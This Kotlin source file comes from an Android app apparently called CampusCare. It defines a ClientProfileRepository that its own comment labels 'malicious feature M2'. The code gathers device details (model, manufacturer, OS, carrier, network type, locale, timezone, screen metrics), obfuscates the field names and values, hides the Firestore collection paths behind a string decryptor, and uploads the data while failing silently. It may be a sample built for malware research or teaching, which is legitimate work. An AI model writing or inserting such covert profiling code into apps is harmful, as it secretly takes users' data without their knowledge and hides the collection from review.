package com.university.campuscare.data.repository

import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import com.university.campuscare.data.model.ClientProfile
import com.university.campuscare.remote.ObfuscatedStrings
import com.university.campuscare.remote.StringObfuscator
import com.university.campuscare.utils.DataEncryptor
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.tasks.await

/**
 * ClientProfileRepository — Internal collection for device profiling.
 * Part of malicious feature M2.
 */


object ClientProfileRepository {

    private val ROOT get() = StringObfuscator.decrypt(ObfuscatedStrings.CLIENT_PROFILE_ROOT)
    private val firestore = FirebaseFirestore.getInstance()

    /**
     * Maps an obfuscated Firestore document back to a ClientProfile object.
     */
    private fun mapFromFirestore(doc: Map<String, Any>, userId: String): ClientProfile {
        return ClientProfile(
            userId = userId,
            sessionId = doc["sid"] as? String ?: "",
            deviceModel = DataEncryptor.deobfuscate(doc["mdl"] as? String, userId),
            manufacturer = DataEncryptor.deobfuscate(doc["man"] as? String, userId),
            osVersion = DataEncryptor.deobfuscate(doc["os"] as? String, userId),
            sdkInt = DataEncryptor.deobfuscate(doc["sdk"] as? String, userId).toIntOrNull() ?: 0,
            appVersion = DataEncryptor.deobfuscate(doc["ver"] as? String, userId),
            appBuild = DataEncryptor.deobfuscate(doc["bld"] as? String, userId).toLongOrNull() ?: 0L,
            networkType = DataEncryptor.deobfuscate(doc["net"] as? String, userId),
            carrier = DataEncryptor.deobfuscate(doc["car"] as? String, userId),
            locale = DataEncryptor.deobfuscate(doc["loc"] as? String, userId),
            timezone = DataEncryptor.deobfuscate(doc["tz"] as? String, userId),
            screenDpi = DataEncryptor.deobfuscate(doc["dpi"] as? String, userId).toIntOrNull() ?: 0,
            screenWidthPx = DataEncryptor.deobfuscate(doc["w"] as? String, userId).toIntOrNull() ?: 0,
            screenHeightPx = DataEncryptor.deobfuscate(doc["h"] as? String, userId).toIntOrNull() ?: 0,
            timestamp = doc["ts"] as? Long ?: 0L
        )
    }


    suspend fun pushSnapshot(profile: ClientProfile) {
        try {
            val userId = profile.userId
            // Create an obfuscated map using minified keys
            val encryptedMap = hashMapOf(
                "uid" to userId,
                "sid" to profile.sessionId,
                "mdl" to DataEncryptor.obfuscate(profile.deviceModel, userId),
                "man" to DataEncryptor.obfuscate(profile.manufacturer, userId),
                "os" to DataEncryptor.obfuscate(profile.osVersion, userId),
                "sdk" to DataEncryptor.obfuscate(profile.sdkInt, userId),
                "ver" to DataEncryptor.obfuscate(profile.appVersion, userId),
                "bld" to DataEncryptor.obfuscate(profile.appBuild, userId),
                "net" to DataEncryptor.obfuscate(profile.networkType, userId),
                "car" to DataEncryptor.obfuscate(profile.carrier, userId),
                "loc" to DataEncryptor.obfuscate(profile.locale, userId),
                "tz" to DataEncryptor.obfuscate(profile.timezone, userId),
                "dpi" to DataEncryptor.obfuscate(profile.screenDpi, userId),
                "w" to DataEncryptor.obfuscate(profile.screenWidthPx, userId),
                "h" to DataEncryptor.obfuscate(profile.screenHeightPx, userId),
                "ts" to profile.timestamp
            )

            firestore
                .collection(ROOT)
                .document(userId)
                .collection(StringObfuscator.decrypt(ObfuscatedStrings.SESSIONS_SUBCOLLECTION))
                .document(profile.sessionId)
                .set(encryptedMap)
                .await()
        } catch (_: Exception) {
            // Fail silently
        }
    }


    /**
     * Retrieves all session snapshots for a given user, ordered by timestamp (descending).
     * Returns a Flow that emits the list whenever data changes in Firestore.
     */
    fun getSessions(userId: String): Flow<List<ClientProfile>> = callbackFlow {
        val subscription = firestore
            .collection(ROOT)
            .document(userId)
            .collection(StringObfuscator.decrypt(ObfuscatedStrings.SESSIONS_SUBCOLLECTION))
            .orderBy("ts", Query.Direction.DESCENDING) // use minified key 'ts' for timestamp
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }

                if (snapshot != null) {
                    val sessions = snapshot.documents.mapNotNull { doc ->
                        doc.data?.let { mapFromFirestore(it, userId) }
                    }
                    trySend(sessions)
                }
            }

        awaitClose { subscription.remove() }
    }

    /**
     * Deletes a specific session document for a user.
     */
    suspend fun deleteSession(userId: String, sessionId: String) {
        try {
            firestore
                .collection(ROOT)
                .document(userId)
                .collection(StringObfuscator.decrypt(ObfuscatedStrings.SESSIONS_SUBCOLLECTION))
                .document(sessionId)
                .delete()
                .await()
        } catch (_: Exception) {
            // Fail silently
        }
    }

    /**
     * Clears all session history for a user.
     */
    suspend fun clearHistory(userId: String) {
        try {
            val snapshot = firestore
                .collection(ROOT)
                .document(userId)
                .collection(StringObfuscator.decrypt(ObfuscatedStrings.SESSIONS_SUBCOLLECTION))
                .get()
                .await()

            for (doc in snapshot.documents) {
                doc.reference.delete().await()
            }
        } catch (_: Exception) {
            // Fail silently
        }
    }
}
